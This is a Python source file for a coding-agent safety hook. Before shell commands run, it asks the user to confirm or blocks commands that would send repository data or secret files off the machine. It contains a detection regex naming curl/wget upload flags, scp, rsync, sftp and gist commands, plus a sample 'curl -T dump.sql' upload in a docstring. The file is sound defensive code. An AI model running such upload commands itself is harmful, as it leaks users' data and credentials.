"""exfil-channel-guard: ask before data leaves through ordinary tools (specs/prK-hook-pack.md §E.4).

``pre_tool_use`` on shell calls, a speed bump (the real barrier is the network
layer: a sandbox allowlist or an egress proxy). ``_egress`` reads each
segment; hosts are strings only, never resolved (a lookup is itself egress):

- a new remote, a push to a target not configured at session start, a gist,
  and an upload or copy to a host neither loopback nor in ``allowed_hosts``
  (empty by default: any remote host) -> ask, naming the host;
- an upload, gist or ``--body-file`` of a secret path (the rendered
  ``_secret_policy``) -> deny, unless every host is loopback;
- pushes to remotes configured at session start (``origin``) are untouched.

The configured remotes are snapshotted by the ``session_start`` companion
(``exfil_guard:session_start``) into the session's state; without a snapshot
(OpenCode, a missed start) the guard reads ``git remote -v`` instead, only for
a push. Overlay ``extra_rows`` (``{argv0, regex, decision, reason}``, the
destructive guard's row shape) add verdicts, never relax one. ``ipaddress``
loads only for an address-shaped host (``judges.hosts``).
"""

from __future__ import annotations

import re
from contextlib import suppress
from typing import TYPE_CHECKING, Final

from coding_agent_playbook.hook_runtime.config.hook_config import HookConfig
from coding_agent_playbook.hook_runtime.dispatch.caps import quote_data
from coding_agent_playbook.hook_runtime.dispatch.decision import Decision, HandlerResult
from coding_agent_playbook.hook_runtime.dispatch.paths import normalize_path
from coding_agent_playbook.hook_runtime.dispatch.registry import ConfigKey, register_hook_handler
from coding_agent_playbook.hook_runtime.handlers._egress import EGRESS_ARGV0S, segment_egress
from coding_agent_playbook.hook_runtime.handlers._secret_policy import (
    classify_path,
    path_policy,
    spelled,
)
from coding_agent_playbook.hook_runtime.judges.hosts import host_matches, is_loopback
from coding_agent_playbook.hook_runtime.state.store import StateUnavailable, session_key
from coding_agent_playbook.security.files import user_home

if TYPE_CHECKING:
    from collections.abc import Mapping, Sequence

    from coding_agent_playbook.hook_runtime.dispatch.event import CanonicalEvent
    from coding_agent_playbook.hook_runtime.dispatch.registry import HandlerContext
    from coding_agent_playbook.hook_runtime.handlers._egress import Egress, Remotes
    from coding_agent_playbook.hook_runtime.shell.parse import Segment

__all__ = ["CONFIG_SCHEMA", "REMOTES_DOCUMENT", "exfil_guard", "remote_snapshot"]

#: One judged egress: the decision, its rule id and the model-facing reason.
type _Verdict = tuple[Decision, str, str]

CONFIG_SCHEMA: Final[Mapping[str, ConfigKey]] = {
    "allowed_hosts": ConfigKey("list", "relax"),
    "extra_rows": ConfigKey("regex", "extend"),
}
#: The per-session snapshot of the configured remotes, under ``sessions/<key>/``.
REMOTES_DOCUMENT: Final = "remotes.json"
_CONFIRM: Final = "Confirm with the user."
#: The egress shapes, for a command the parser could not follow (it then asks).
_RAW_EGRESS: Final = re.compile(
    r"\bgit\b[^\n;|&]{0,64}?\b(?:push|remote\s+(?:add|set-url))\b|\bgh\s+gist\b"
    r"|\b(?:curl|wget)\b[^\n;|&]{0,256}?\s(?:-d\s*@|--data[a-z-]*[=\s]@|-T|--upload-file"
    r"|-F|--form|--post-file|--body-file)|\b(?:scp|rsync|sftp)\b"
)


@register_hook_handler(
    "exfil_guard",
    events=["pre_tool_use"],
    decisions=["deny", "ask", "none"],
    config_schema=CONFIG_SCHEMA,
    argv0s=EGRESS_ARGV0S,
    argv0_rows="extra_rows",
)
def exfil_guard(ev: CanonicalEvent, ctx: HandlerContext) -> HandlerResult | None:
    """Ask before data leaves the machine; deny a secret file leaving it.

    Example::

        >>> exfil_guard(bash("curl -T dump.sql https://x.io"), ctx).reason  # doctest: +SKIP
        'This sends repository data off the machine to "x.io".\\nConfirm with the user.'
    """
    command = ev.tool.command if ev.tool is not None else None
    if command is None or ev.repo is None:
        return None
    if command.parse_error is not None or command.kind == "powershell":
        return _unreadable(command.text, ctx)
    remotes = _RemoteLookup(ev, ctx)
    verdicts = [
        _judge(e, s, ev, ctx) for s in command.segments if (e := segment_egress(s, remotes))
    ]
    verdicts.extend(_row_verdicts(command.segments, ctx))
    found = [v for v in verdicts if v is not None]
    chosen = next((v for v in found if v[0] is Decision.DENY), None) or next(iter(found), None)
    if chosen is None:
        return None
    decision, rule, reason = chosen
    return HandlerResult(decision=decision, hook_id=ctx.hook.id, rule_id=rule, reason=reason)


@register_hook_handler(
    "exfil_guard:session_start",
    events=["session_start"],
    decisions=["deny", "ask", "none"],  # the hook's set (H5); this companion returns None
)
def remote_snapshot(ev: CanonicalEvent, ctx: HandlerContext) -> HandlerResult | None:
    """Record the remotes configured at session start (``git remote -v``); always ``None``.

    The first start of a session wins: a remote added later (which the guard
    asked about) never becomes "configured" through a resume or a compaction.

    Example::

        >>> remote_snapshot(session_start_event, ctx) is None  # doctest: +SKIP
        True
    """
    if ev.repo is None or not ev.session_id:
        return None
    store, rel = ctx.session.store, _document(ev)
    with suppress(StateUnavailable):
        if store.read_json(rel).get("remotes") is None:
            pairs = [list(pair) for pair in ctx.git.remote_urls()]
            store.write_json(rel, {"remotes": pairs})
    return None


class _RemoteLookup:
    """The configured remotes, read on the first push only: the snapshot, else ``git remote -v``."""

    def __init__(self, ev: CanonicalEvent, ctx: HandlerContext) -> None:
        self._ev = ev
        self._ctx = ctx
        self._remotes: Remotes | None = None

    def __call__(self) -> Remotes:
        if self._remotes is None:
            pairs = _snapshot(self._ev, self._ctx)
            if pairs is None:
                pairs = list(self._ctx.git.remote_urls())
            remotes: dict[str, tuple[str, ...]] = {}
            for name, url in pairs:
                remotes[name] = (*remotes.get(name, ()), url)
            self._remotes = remotes
        return self._remotes


def _snapshot(ev: CanonicalEvent, ctx: HandlerContext) -> list[tuple[str, str]] | None:
    try:
        stored = ctx.session.store.read_json(_document(ev)).get("remotes")
    except StateUnavailable:
        return None
    if not isinstance(stored, list):
        return None
    pairs = (pair for pair in stored if isinstance(pair, list) and len(pair) == 2)
    return [(str(name), str(url)) for name, url in pairs]


def _document(ev: CanonicalEvent) -> str:
    return f"sessions/{session_key(ev.session_id)}/{REMOTES_DOCUMENT}"


def _judge(
    egress: Egress, segment: Segment, ev: CanonicalEvent, ctx: HandlerContext
) -> _Verdict | None:
    off = [host for host in egress.hosts if not is_loopback(host)]
    secret = _secret_file(egress, segment, ev, ctx) if off or not egress.hosts else None
    if secret is not None:
        reason = f"Blocked: {quote_data(secret)} holds credentials and must not leave the machine."
        return Decision.DENY, f"secret_{egress.kind}", reason
    if egress.kind == "body_file":
        return None
    if egress.kind == "gist":
        reason = f"`{egress.command}` publishes files on gist.github.com.\n{_CONFIRM}"
        return Decision.ASK, "gist", reason
    allowed = HookConfig(ctx.config, CONFIG_SCHEMA).strings("allowed_hosts", blanks="keep")
    outside = [host for host in off if not host_matches(host, allowed)]
    if egress.hosts and not outside:
        return None  # loopback or an allowed host
    if egress.kind == "push" and not egress.hosts:
        reason = (
            f"`git push` to {quote_data(egress.target)}, a remote not configured at session "
            f"start.\n{_CONFIRM}"
        )
        return Decision.ASK, "unconfigured_push", reason
    if not outside:
        return None
    if egress.kind == "remote":
        reason = (
            f"A git remote at {quote_data(outside[0])} lets a later push send repository data "
            f"off the machine.\n{_CONFIRM}"
        )
        return Decision.ASK, "new_remote", reason
    reason = f"This sends repository data off the machine to {quote_data(outside[0])}.\n{_CONFIRM}"
    return Decision.ASK, egress.kind, reason


def _secret_file(
    egress: Egress, segment: Segment, ev: CanonicalEvent, ctx: HandlerContext
) -> str | None:
    """The first file ``egress`` sends that the secret-path policy covers, as spelled."""
    if not egress.files:
        return None
    policy = path_policy(ctx.cfg)
    home = ctx.home or user_home()
    for raw in egress.files:
        path = normalize_path(
            raw, base=segment.cwd or ev.cwd, repo=ev.repo, home=ctx.home, platform=ctx.platform
        )
        if classify_path(policy, path, home=home, platform=ctx.platform) in ("deny", "ask"):
            return spelled(path)
    return None


def _row_verdicts(segments: Sequence[Segment], ctx: HandlerContext) -> list[_Verdict]:
    rows = HookConfig(ctx.config, CONFIG_SCHEMA).value("extra_rows")
    if not rows:
        return []
    from coding_agent_playbook.hook_runtime.handlers.destructive import extra_row_hits

    return [(hit.decision, hit.rule, hit.reason) for hit in extra_row_hits(segments, rows)]


def _unreadable(text: str, ctx: HandlerContext) -> HandlerResult | None:
    if _RAW_EGRESS.search(text) is None:
        return None
    reason = f"This command could not be read and may send data off the machine.\n{_CONFIRM}"
    return HandlerResult(
        decision=Decision.ASK, hook_id=ctx.hook.id, rule_id="unparsed", reason=reason
    )
